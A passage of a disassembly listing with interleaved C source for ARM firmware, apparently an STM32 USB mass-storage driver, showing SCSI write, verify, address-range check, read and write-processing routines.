 800ab90:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800ab92:	687b      	ldr	r3, [r7, #4]
 800ab94:	3307      	adds	r3, #7
 800ab96:	781b      	ldrb	r3, [r3, #0]
 800ab98:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800ab9a:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800ab9c:	687b      	ldr	r3, [r7, #4]
 800ab9e:	3308      	adds	r3, #8
 800aba0:	781b      	ldrb	r3, [r3, #0]
 800aba2:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800aba4:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800aba6:	687a      	ldr	r2, [r7, #4]
 800aba8:	3209      	adds	r2, #9
 800abaa:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800abac:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800abae:	697a      	ldr	r2, [r7, #20]
 800abb0:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800abb4:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800abb6:	697b      	ldr	r3, [r7, #20]
 800abb8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abbc:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800abbe:	697b      	ldr	r3, [r7, #20]
 800abc0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abc4:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800abc6:	7af9      	ldrb	r1, [r7, #11]
 800abc8:	68f8      	ldr	r0, [r7, #12]
 800abca:	f000 f886 	bl	800acda <SCSI_CheckAddressRange>
 800abce:	4603      	mov	r3, r0
 800abd0:	2b00      	cmp	r3, #0
 800abd2:	da02      	bge.n	800abda <SCSI_Write12+0x166>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800abd4:	f04f 33ff 	mov.w	r3, #4294967295
 800abd8:	e039      	b.n	800ac4e <SCSI_Write12+0x1da>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800abda:	697b      	ldr	r3, [r7, #20]
 800abdc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abe0:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800abe2:	697a      	ldr	r2, [r7, #20]
 800abe4:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800abe8:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800abec:	fb02 f303 	mul.w	r3, r2, r3
 800abf0:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800abf2:	697b      	ldr	r3, [r7, #20]
 800abf4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abf8:	699b      	ldr	r3, [r3, #24]
 800abfa:	693a      	ldr	r2, [r7, #16]
 800abfc:	429a      	cmp	r2, r3
 800abfe:	d00b      	beq.n	800ac18 <SCSI_Write12+0x1a4>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800ac00:	697b      	ldr	r3, [r7, #20]
 800ac02:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac06:	7f59      	ldrb	r1, [r3, #29]
 800ac08:	2320      	movs	r3, #32
 800ac0a:	2205      	movs	r2, #5
 800ac0c:	68f8      	ldr	r0, [r7, #12]
 800ac0e:	f7ff fbeb 	bl	800a3e8 <SCSI_SenseCode>
      return -1;
 800ac12:	f04f 33ff 	mov.w	r3, #4294967295
 800ac16:	e01a      	b.n	800ac4e <SCSI_Write12+0x1da>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800ac18:	693b      	ldr	r3, [r7, #16]
 800ac1a:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800ac1e:	bf28      	it	cs
 800ac20:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800ac24:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800ac26:	697b      	ldr	r3, [r7, #20]
 800ac28:	2201      	movs	r2, #1
 800ac2a:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800ac2c:	4b0a      	ldr	r3, [pc, #40]	; (800ac58 <SCSI_Write12+0x1e4>)
 800ac2e:	7819      	ldrb	r1, [r3, #0]
 800ac30:	697b      	ldr	r3, [r7, #20]
 800ac32:	f103 0210 	add.w	r2, r3, #16
 800ac36:	693b      	ldr	r3, [r7, #16]
 800ac38:	68f8      	ldr	r0, [r7, #12]
 800ac3a:	f002 f9ff 	bl	800d03c <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800ac3e:	2300      	movs	r3, #0
 800ac40:	e005      	b.n	800ac4e <SCSI_Write12+0x1da>
    return SCSI_ProcessWrite(pdev, lun);
 800ac42:	7afb      	ldrb	r3, [r7, #11]
 800ac44:	4619      	mov	r1, r3
 800ac46:	68f8      	ldr	r0, [r7, #12]
 800ac48:	f000 f90a 	bl	800ae60 <SCSI_ProcessWrite>
 800ac4c:	4603      	mov	r3, r0
}
 800ac4e:	4618      	mov	r0, r3
 800ac50:	3718      	adds	r7, #24
 800ac52:	46bd      	mov	sp, r7
 800ac54:	bd80      	pop	{r7, pc}
 800ac56:	bf00      	nop
 800ac58:	2000010b 	.word	0x2000010b

0800ac5c <SCSI_Verify10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Verify10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800ac5c:	b580      	push	{r7, lr}
 800ac5e:	b086      	sub	sp, #24
 800ac60:	af00      	add	r7, sp, #0
 800ac62:	60f8      	str	r0, [r7, #12]
 800ac64:	460b      	mov	r3, r1
 800ac66:	607a      	str	r2, [r7, #4]
 800ac68:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ac6a:	68fb      	ldr	r3, [r7, #12]
 800ac6c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ac70:	68fb      	ldr	r3, [r7, #12]
 800ac72:	32b0      	adds	r2, #176	; 0xb0
 800ac74:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ac78:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800ac7a:	697b      	ldr	r3, [r7, #20]
 800ac7c:	2b00      	cmp	r3, #0
 800ac7e:	d102      	bne.n	800ac86 <SCSI_Verify10+0x2a>
  {
    return -1;
 800ac80:	f04f 33ff 	mov.w	r3, #4294967295
 800ac84:	e025      	b.n	800acd2 <SCSI_Verify10+0x76>
  }

  if ((params[1] & 0x02U) == 0x02U)
 800ac86:	687b      	ldr	r3, [r7, #4]
 800ac88:	3301      	adds	r3, #1
 800ac8a:	781b      	ldrb	r3, [r3, #0]
 800ac8c:	f003 0302 	and.w	r3, r3, #2
 800ac90:	2b00      	cmp	r3, #0
 800ac92:	d008      	beq.n	800aca6 <SCSI_Verify10+0x4a>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800ac94:	7af9      	ldrb	r1, [r7, #11]
 800ac96:	2324      	movs	r3, #36	; 0x24
 800ac98:	2205      	movs	r2, #5
 800ac9a:	68f8      	ldr	r0, [r7, #12]
 800ac9c:	f7ff fba4 	bl	800a3e8 <SCSI_SenseCode>
    return -1; /* Error, Verify Mode Not supported*/
 800aca0:	f04f 33ff 	mov.w	r3, #4294967295
 800aca4:	e015      	b.n	800acd2 <SCSI_Verify10+0x76>
  }

  if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr, hmsc->scsi_blk_len) < 0)
 800aca6:	697b      	ldr	r3, [r7, #20]
 800aca8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acac:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800acae:	697b      	ldr	r3, [r7, #20]
 800acb0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acb4:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800acb6:	7af9      	ldrb	r1, [r7, #11]
 800acb8:	68f8      	ldr	r0, [r7, #12]
 800acba:	f000 f80e 	bl	800acda <SCSI_CheckAddressRange>
 800acbe:	4603      	mov	r3, r0
 800acc0:	2b00      	cmp	r3, #0
 800acc2:	da02      	bge.n	800acca <SCSI_Verify10+0x6e>
  {
    return -1; /* error */
 800acc4:	f04f 33ff 	mov.w	r3, #4294967295
 800acc8:	e003      	b.n	800acd2 <SCSI_Verify10+0x76>
  }

  hmsc->bot_data_length = 0U;
 800acca:	697b      	ldr	r3, [r7, #20]
 800accc:	2200      	movs	r2, #0
 800acce:	60da      	str	r2, [r3, #12]

  return 0;
 800acd0:	2300      	movs	r3, #0
}
 800acd2:	4618      	mov	r0, r3
 800acd4:	3718      	adds	r7, #24
 800acd6:	46bd      	mov	sp, r7
 800acd8:	bd80      	pop	{r7, pc}

0800acda <SCSI_CheckAddressRange>:
  * @param  blk_nbr: number of block to be processed
  * @retval status
  */
static int8_t SCSI_CheckAddressRange(USBD_HandleTypeDef *pdev, uint8_t lun,
                                     uint32_t blk_offset, uint32_t blk_nbr)
{
 800acda:	b580      	push	{r7, lr}
 800acdc:	b086      	sub	sp, #24
 800acde:	af00      	add	r7, sp, #0
 800ace0:	60f8      	str	r0, [r7, #12]
 800ace2:	607a      	str	r2, [r7, #4]
 800ace4:	603b      	str	r3, [r7, #0]
 800ace6:	460b      	mov	r3, r1
 800ace8:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800acea:	68fb      	ldr	r3, [r7, #12]
 800acec:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800acf0:	68fb      	ldr	r3, [r7, #12]
 800acf2:	32b0      	adds	r2, #176	; 0xb0
 800acf4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800acf8:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800acfa:	697b      	ldr	r3, [r7, #20]
 800acfc:	2b00      	cmp	r3, #0
 800acfe:	d102      	bne.n	800ad06 <SCSI_CheckAddressRange+0x2c>
  {
    return -1;
 800ad00:	f04f 33ff 	mov.w	r3, #4294967295
 800ad04:	e012      	b.n	800ad2c <SCSI_CheckAddressRange+0x52>
  }

  if ((blk_offset + blk_nbr) > hmsc->scsi_blk_nbr)
 800ad06:	687a      	ldr	r2, [r7, #4]
 800ad08:	683b      	ldr	r3, [r7, #0]
 800ad0a:	441a      	add	r2, r3
 800ad0c:	697b      	ldr	r3, [r7, #20]
 800ad0e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad12:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800ad14:	429a      	cmp	r2, r3
 800ad16:	d908      	bls.n	800ad2a <SCSI_CheckAddressRange+0x50>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, ADDRESS_OUT_OF_RANGE);
 800ad18:	7af9      	ldrb	r1, [r7, #11]
 800ad1a:	2321      	movs	r3, #33	; 0x21
 800ad1c:	2205      	movs	r2, #5
 800ad1e:	68f8      	ldr	r0, [r7, #12]
 800ad20:	f7ff fb62 	bl	800a3e8 <SCSI_SenseCode>
    return -1;
 800ad24:	f04f 33ff 	mov.w	r3, #4294967295
 800ad28:	e000      	b.n	800ad2c <SCSI_CheckAddressRange+0x52>
  }

  return 0;
 800ad2a:	2300      	movs	r3, #0
}
 800ad2c:	4618      	mov	r0, r3
 800ad2e:	3718      	adds	r7, #24
 800ad30:	46bd      	mov	sp, r7
 800ad32:	bd80      	pop	{r7, pc}

0800ad34 <SCSI_ProcessRead>:
  *         Handle Read Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessRead(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800ad34:	b590      	push	{r4, r7, lr}
 800ad36:	b085      	sub	sp, #20
 800ad38:	af00      	add	r7, sp, #0
 800ad3a:	6078      	str	r0, [r7, #4]
 800ad3c:	460b      	mov	r3, r1
 800ad3e:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ad40:	687b      	ldr	r3, [r7, #4]
 800ad42:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ad46:	687b      	ldr	r3, [r7, #4]
 800ad48:	32b0      	adds	r2, #176	; 0xb0
 800ad4a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ad4e:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800ad50:	68fb      	ldr	r3, [r7, #12]
 800ad52:	2b00      	cmp	r3, #0
 800ad54:	d102      	bne.n	800ad5c <SCSI_ProcessRead+0x28>
  {
    return -1;
 800ad56:	f04f 33ff 	mov.w	r3, #4294967295
 800ad5a:	e07b      	b.n	800ae54 <SCSI_ProcessRead+0x120>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800ad5c:	68fb      	ldr	r3, [r7, #12]
 800ad5e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad62:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ad64:	68fa      	ldr	r2, [r7, #12]
 800ad66:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ad6a:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800ad6e:	fb02 f303 	mul.w	r3, r2, r3
 800ad72:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800ad74:	68bb      	ldr	r3, [r7, #8]
 800ad76:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800ad7a:	bf28      	it	cs
 800ad7c:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800ad80:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800ad82:	687b      	ldr	r3, [r7, #4]
 800ad84:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800ad88:	687a      	ldr	r2, [r7, #4]
 800ad8a:	33b0      	adds	r3, #176	; 0xb0
 800ad8c:	009b      	lsls	r3, r3, #2
 800ad8e:	4413      	add	r3, r2
 800ad90:	685b      	ldr	r3, [r3, #4]
 800ad92:	691c      	ldr	r4, [r3, #16]
 800ad94:	68fb      	ldr	r3, [r7, #12]
 800ad96:	f103 0110 	add.w	r1, r3, #16
 800ad9a:	68fb      	ldr	r3, [r7, #12]
 800ad9c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ada0:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                    hmsc->scsi_blk_addr,
                                                                    (len / hmsc->scsi_blk_size)) < 0)
 800ada2:	68fb      	ldr	r3, [r7, #12]
 800ada4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ada8:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800adac:	4618      	mov	r0, r3
 800adae:	68bb      	ldr	r3, [r7, #8]
 800adb0:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800adb4:	b29b      	uxth	r3, r3
 800adb6:	78f8      	ldrb	r0, [r7, #3]
 800adb8:	47a0      	blx	r4
 800adba:	4603      	mov	r3, r0
 800adbc:	2b00      	cmp	r3, #0
 800adbe:	da08      	bge.n	800add2 <SCSI_ProcessRead+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, UNRECOVERED_READ_ERROR);
 800adc0:	78f9      	ldrb	r1, [r7, #3]
 800adc2:	2311      	movs	r3, #17
 800adc4:	2204      	movs	r2, #4
 800adc6:	6878      	ldr	r0, [r7, #4]
 800adc8:	f7ff fb0e 	bl	800a3e8 <SCSI_SenseCode>
    return -1;
 800adcc:	f04f 33ff 	mov.w	r3, #4294967295
 800add0:	e040      	b.n	800ae54 <SCSI_ProcessRead+0x120>
  }

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, hmsc->bot_data, len);
 800add2:	4b22      	ldr	r3, [pc, #136]	; (800ae5c <SCSI_ProcessRead+0x128>)
 800add4:	7819      	ldrb	r1, [r3, #0]
 800add6:	68fb      	ldr	r3, [r7, #12]
 800add8:	f103 0210 	add.w	r2, r3, #16
 800addc:	68bb      	ldr	r3, [r7, #8]
 800adde:	6878      	ldr	r0, [r7, #4]
 800ade0:	f002 f8f4 	bl	800cfcc <USBD_LL_Transmit>

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800ade4:	68fb      	ldr	r3, [r7, #12]
 800ade6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800adea:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800adec:	68fb      	ldr	r3, [r7, #12]
 800adee:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800adf2:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800adf6:	4619      	mov	r1, r3
 800adf8:	68bb      	ldr	r3, [r7, #8]
 800adfa:	fbb3 f3f1 	udiv	r3, r3, r1
 800adfe:	4413      	add	r3, r2
 800ae00:	68fa      	ldr	r2, [r7, #12]
 800ae02:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ae06:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800ae08:	68fb      	ldr	r3, [r7, #12]
 800ae0a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ae0e:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800ae10:	68fb      	ldr	r3, [r7, #12]
 800ae12:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ae16:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ae1a:	4619      	mov	r1, r3
 800ae1c:	68bb      	ldr	r3, [r7, #8]
 800ae1e:	fbb3 f3f1 	udiv	r3, r3, r1
 800ae22:	1ad3      	subs	r3, r2, r3
 800ae24:	68fa      	ldr	r2, [r7, #12]
 800ae26:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ae2a:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 6 : Hi = Di */
  hmsc->csw.dDataResidue -= len;
 800ae2c:	68fb      	ldr	r3, [r7, #12]
 800ae2e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ae32:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800ae34:	68bb      	ldr	r3, [r7, #8]
 800ae36:	1ad3      	subs	r3, r2, r3
 800ae38:	68fa      	ldr	r2, [r7, #12]
 800ae3a:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ae3e:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800ae40:	68fb      	ldr	r3, [r7, #12]
 800ae42:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ae46:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ae48:	2b00      	cmp	r3, #0
 800ae4a:	d102      	bne.n	800ae52 <SCSI_ProcessRead+0x11e>
  {
    hmsc->bot_state = USBD_BOT_LAST_DATA_IN;
 800ae4c:	68fb      	ldr	r3, [r7, #12]
 800ae4e:	2203      	movs	r2, #3
 800ae50:	721a      	strb	r2, [r3, #8]
  }

  return 0;
 800ae52:	2300      	movs	r3, #0
}
 800ae54:	4618      	mov	r0, r3
 800ae56:	3714      	adds	r7, #20
 800ae58:	46bd      	mov	sp, r7
 800ae5a:	bd90      	pop	{r4, r7, pc}
 800ae5c:	2000010a 	.word	0x2000010a

0800ae60 <SCSI_ProcessWrite>:
  *         Handle Write Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessWrite(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800ae60:	b590      	push	{r4, r7, lr}
 800ae62:	b085      	sub	sp, #20
 800ae64:	af00      	add	r7, sp, #0
 800ae66:	6078      	str	r0, [r7, #4]
 800ae68:	460b      	mov	r3, r1
 800ae6a:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ae6c:	687b      	ldr	r3, [r7, #4]
 800ae6e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ae72:	687b      	ldr	r3, [r7, #4]
 800ae74:	32b0      	adds	r2, #176	; 0xb0
 800ae76:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ae7a:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800ae7c:	68fb      	ldr	r3, [r7, #12]
 800ae7e:	2b00      	cmp	r3, #0
 800ae80:	d102      	bne.n	800ae88 <SCSI_ProcessWrite+0x28>
  {
    return -1;
 800ae82:	f04f 33ff 	mov.w	r3, #4294967295
 800ae86:	e08e      	b.n	800afa6 <SCSI_ProcessWrite+0x146>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800ae88:	68fb      	ldr	r3, [r7, #12]
 800ae8a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ae8e:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ae90:	68fa      	ldr	r2, [r7, #12]
 800ae92:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ae96:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800ae9a:	fb02 f303 	mul.w	r3, r2, r3
 800ae9e:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800aea0:	68bb      	ldr	r3, [r7, #8]
 800aea2:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800aea6:	bf28      	it	cs
 800aea8:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800aeac:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800aeae:	687b      	ldr	r3, [r7, #4]
 800aeb0:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800aeb4:	687a      	ldr	r2, [r7, #4]
 800aeb6:	33b0      	adds	r3, #176	; 0xb0
 800aeb8:	009b      	lsls	r3, r3, #2
 800aeba:	4413      	add	r3, r2
 800aebc:	685b      	ldr	r3, [r3, #4]
 800aebe:	695c      	ldr	r4, [r3, #20]
 800aec0:	68fb      	ldr	r3, [r7, #12]
 800aec2:	f103 0110 	add.w	r1, r3, #16
 800aec6:	68fb      	ldr	r3, [r7, #12]
 800aec8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aecc:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                     hmsc->scsi_blk_addr,
                                                                     (len / hmsc->scsi_blk_size)) < 0)
 800aece:	68fb      	ldr	r3, [r7, #12]
 800aed0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aed4:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800aed8:	4618      	mov	r0, r3
 800aeda:	68bb      	ldr	r3, [r7, #8]
 800aedc:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800aee0:	b29b      	uxth	r3, r3
 800aee2:	78f8      	ldrb	r0, [r7, #3]
 800aee4:	47a0      	blx	r4
 800aee6:	4603      	mov	r3, r0
 800aee8:	2b00      	cmp	r3, #0
 800aeea:	da08      	bge.n	800aefe <SCSI_ProcessWrite+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, WRITE_FAULT);
 800aeec:	78f9      	ldrb	r1, [r7, #3]
 800aeee:	2303      	movs	r3, #3
 800aef0:	2204      	movs	r2, #4
 800aef2:	6878      	ldr	r0, [r7, #4]
 800aef4:	f7ff fa78 	bl	800a3e8 <SCSI_SenseCode>
    return -1;
 800aef8:	f04f 33ff 	mov.w	r3, #4294967295
 800aefc:	e053      	b.n	800afa6 <SCSI_ProcessWrite+0x146>
  }

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800aefe:	68fb      	ldr	r3, [r7, #12]
 800af00:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af04:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800af06:	68fb      	ldr	r3, [r7, #12]
 800af08:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af0c:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800af10:	4619      	mov	r1, r3
 800af12:	68bb      	ldr	r3, [r7, #8]
 800af14:	fbb3 f3f1 	udiv	r3, r3, r1
 800af18:	4413      	add	r3, r2
 800af1a:	68fa      	ldr	r2, [r7, #12]
 800af1c:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800af20:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800af22:	68fb      	ldr	r3, [r7, #12]
 800af24:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af28:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800af2a:	68fb      	ldr	r3, [r7, #12]
 800af2c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af30:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800af34:	4619      	mov	r1, r3
 800af36:	68bb      	ldr	r3, [r7, #8]
 800af38:	fbb3 f3f1 	udiv	r3, r3, r1
 800af3c:	1ad3      	subs	r3, r2, r3
 800af3e:	68fa      	ldr	r2, [r7, #12]
 800af40:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800af44:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 12 : Ho = Do */
  hmsc->csw.dDataResidue -= len;
 800af46:	68fb      	ldr	r3, [r7, #12]
 800af48:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af4c:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800af4e:	68bb      	ldr	r3, [r7, #8]
 800af50:	1ad3      	subs	r3, r2, r3
 800af52:	68fa      	ldr	r2, [r7, #12]
 800af54:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800af58:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800af5a:	68fb      	ldr	r3, [r7, #12]
 800af5c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af60:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800af62:	2b00      	cmp	r3, #0
 800af64:	d104      	bne.n	800af70 <SCSI_ProcessWrite+0x110>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 800af66:	2100      	movs	r1, #0
 800af68:	6878      	ldr	r0, [r7, #4]
 800af6a:	f7fe fc53 	bl	8009814 <MSC_BOT_SendCSW>
 800af6e:	e019      	b.n	800afa4 <SCSI_ProcessWrite+0x144>
  }
  else
  {
    len = MIN((hmsc->scsi_blk_len * hmsc->scsi_blk_size), MSC_MEDIA_PACKET);
 800af70:	68fb      	ldr	r3, [r7, #12]
 800af72:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af76:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800af78:	68fa      	ldr	r2, [r7, #12]
 800af7a:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800af7e:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800af82:	fb02 f303 	mul.w	r3, r2, r3
 800af86:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800af8a:	bf28      	it	cs
 800af8c:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800af90:	60bb      	str	r3, [r7, #8]

    /* Prepare EP to Receive next packet */
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800af92:	4b07      	ldr	r3, [pc, #28]	; (800afb0 <SCSI_ProcessWrite+0x150>)
 800af94:	7819      	ldrb	r1, [r3, #0]
 800af96:	68fb      	ldr	r3, [r7, #12]
 800af98:	f103 0210 	add.w	r2, r3, #16
 800af9c:	68bb      	ldr	r3, [r7, #8]
 800af9e:	6878      	ldr	r0, [r7, #4]
 800afa0:	f002 f84c 	bl	800d03c <USBD_LL_PrepareReceive>
  }

  return 0;
 800afa4:	2300      	movs	r3, #0
}
 800afa6:	4618      	mov	r0, r3
 800afa8:	3714      	adds	r7, #20
